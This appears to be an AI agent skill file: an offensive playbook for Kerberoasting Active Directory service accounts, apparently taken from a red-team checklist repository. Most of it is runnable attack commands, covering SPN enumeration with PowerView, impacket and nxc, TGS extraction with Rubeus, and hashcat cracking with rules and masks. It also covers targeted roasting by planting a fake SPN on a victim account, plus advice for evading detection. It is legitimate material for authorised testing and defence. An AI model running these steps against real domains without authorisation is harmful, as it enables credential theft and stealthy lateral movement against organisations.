---
name: offensive-kerberoasting
description: "Kerberoasting attack methodology — SPN enumeration, TGS-REQ requests for SPN-bearing accounts, AES-vs-RC4 hash mode selection, Rubeus / impacket-GetUserSPNs / nxc workflows, hashcat 13100 and 19700 cracking, targeted Kerberoasting via SPN write (when WriteSPN ACL exists), and crack-rate optimization (rules, masks, GPU tuning). Use during authenticated AD recon to extract crackable hashes for service accounts — high hit rate where service accounts have human-set passwords."
---

# Kerberoasting

Service accounts in AD have Service Principal Names (SPNs). Any authenticated user can request a TGS for any SPN — and that TGS is encrypted with the service account's password hash. Crack offline.

## Quick Workflow

1. Enumerate SPN-bearing accounts
2. Request TGS for each (or all at once)
3. Extract hash; convert to hashcat format
4. Crack offline with appropriate dictionary + rules

---

## SPN Enumeration

```powershell
# PowerView
Get-DomainUser -SPN | Select samaccountname,serviceprincipalname

# Native LDAP
$searcher = New-Object DirectoryServices.DirectorySearcher
$searcher.Filter = "(&(objectclass=user)(servicePrincipalName=*))"
$searcher.FindAll() | ForEach-Object {
  Write-Host "$($_.Properties.samaccountname) → $($_.Properties.serviceprincipalname)"
}
```

```bash
# From Linux
impacket-GetUserSPNs corp.local/user:pass -dc-ip 10.0.0.1
nxc ldap dc -u user -p pass --kerberoasting hashes.txt
```

## Request TGS

```powershell
# Rubeus — most flexible
Rubeus.exe kerberoast /outfile:tgs.txt /nowrap

# AES-only accounts (harder to crack but worth attempting)
Rubeus.exe kerberoast /aes /outfile:tgs_aes.txt /nowrap

# Specific user only
Rubeus.exe kerberoast /user:svc_account /nowrap

# Output format options
Rubeus.exe kerberoast /format:hashcat /nowrap  # default
Rubeus.exe kerberoast /format:john /nowrap
```

```bash
# impacket
impacket-GetUserSPNs corp.local/user:pass -dc-ip 10.0.0.1 -request
# Outputs hashcat-format hashes; redirect to file
impacket-GetUserSPNs corp.local/user:pass -dc-ip 10.0.0.1 -request \
  -outputfile tgs.txt
```

## Hash Format

```
$krb5tgs$23$*svc_account$corp.local$cifs/server.corp.local*$<hash>
```

`23` is RC4-HMAC. AES variants:
- `17` = AES128-CTS-HMAC-SHA1-96
- `18` = AES256-CTS-HMAC-SHA1-96

RC4 is faster to crack; AES is slower but still feasible with sufficient GPU power.

## Cracking

```bash
# RC4 (fastest)
hashcat -m 13100 tgs.txt rockyou.txt -r OneRuleToRuleThemAll.rule

# AES256
hashcat -m 19700 tgs.txt rockyou.txt -r OneRuleToRuleThemAll.rule

# Hybrid attacks
hashcat -m 13100 tgs.txt -a 6 wordlist.txt ?d?d?d?d
hashcat -m 13100 tgs.txt -a 7 ?d?d?d?d wordlist.txt

# Mask attacks
hashcat -m 13100 tgs.txt -a 3 ?u?l?l?l?l?l?l?l?d?d
```

Service-account passwords are often:
- Set by humans (vs. randomly generated computer accounts)
- Reused or pattern-based (`Service2024!`, `<servicename>2024`)
- Old (set when the service was provisioned, never rotated)

A 14-char human-set password cracks in hours on a single GPU. An 80-char random one is unbreakable.

## Targeted Kerberoasting (via WriteSPN ACL)

When you have `WriteProperty` on `serviceprincipalname` for a target user (often via ACL abuse), you can:

1. Add a fake SPN to the user
2. Kerberoast their now-SPN'd account
3. Remove the fake SPN to clean up

```powershell
# Set fake SPN
Set-DomainObject -Identity victim -Set @{serviceprincipalname='fake/SPN'}

# Roast
Rubeus.exe kerberoast /user:victim /nowrap

# Clean up
Set-DomainObject -Identity victim -Clear serviceprincipalname
```

This works for any user account where you have the ACL — not just SPN-bearing ones.

## AES-Only Accounts

When the target's `msDS-SupportedEncryptionTypes` excludes RC4, RC4 hashes won't be issued. You must request AES TGS:

```powershell
Rubeus.exe kerberoast /aes /user:svc_account /nowrap
```

AES cracking is computationally heavier — `-m 19700` runs at 1/100th the speed of `-m 13100` on the same hardware. Allocate accordingly.

## Crack Speed Optimization

```bash
# Benchmark your hardware
hashcat -b -m 13100

# Rules — OneRuleToRuleThemAll has highest hit rate
# Custom: combine `dive.rule` + `best64.rule` + `d3ad0ne.rule`

# Cloud GPU bursts
# AWS p4d, GCP A100 — 1-day burst cracks weeks of work

# Distributed via hashtopolis for multi-GPU coordination
```

## Detection Considerations

| Signal | Defender View |
|---|---|
| Bulk TGS-REQ from one user | DC event 4769 with high volume |
| RC4-encrypted TGS request | Some envs flag RC4 (vs AES default) as anomaly |
| MDI Kerberoast detection | Volume + RC4 pattern flagged |
| TGS for unusual SPN | Anomaly detection (low-popularity SPNs) |

To minimize:
- Spread requests across time (Rubeus has `/delay` flag)
- Request only specific high-value SPNs, not bulk
- Request AES if possible (less anomalous)

## Engagement Cheatsheet

```bash
# 1. Enum SPNs
impacket-GetUserSPNs corp.local/user:pass -dc-ip 10.0.0.1

# 2. Request all TGS at once
impacket-GetUserSPNs corp.local/user:pass -dc-ip 10.0.0.1 -request \
  -outputfile tgs.txt

# 3. Crack
hashcat -m 13100 tgs.txt rockyou.txt -r OneRuleToRuleThemAll.rule
hashcat --show -m 13100 tgs.txt   # show cracked

# 4. For each cracked: validate creds, check group memberships, plan use
nxc smb dc -u <svc> -p <pass> -d corp.local

# 5. Document: SPN, account, password, group memberships, follow-on actions
```

## Reporting

- Account name and SPN
- Crack time and method
- Password complexity / pattern (don't include the actual password in the public report)
- Account's privileges (Local Admin? Domain Admin? Service-specific?)
- Recommended remediation: rotate to long random password, mark account as `msDS-SupportedEncryptionTypes` AES-only, or convert to gMSA (Group Managed Service Account, automatic 240-bit rotation)

---

## Key References

- "Kerberoasting" original (Tim Medin, 2014)
- Rubeus: github.com/GhostPack/Rubeus
- impacket-GetUserSPNs documentation
- "Roasting Without the SPN" (targeted variants research)
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/kerberoasting.md
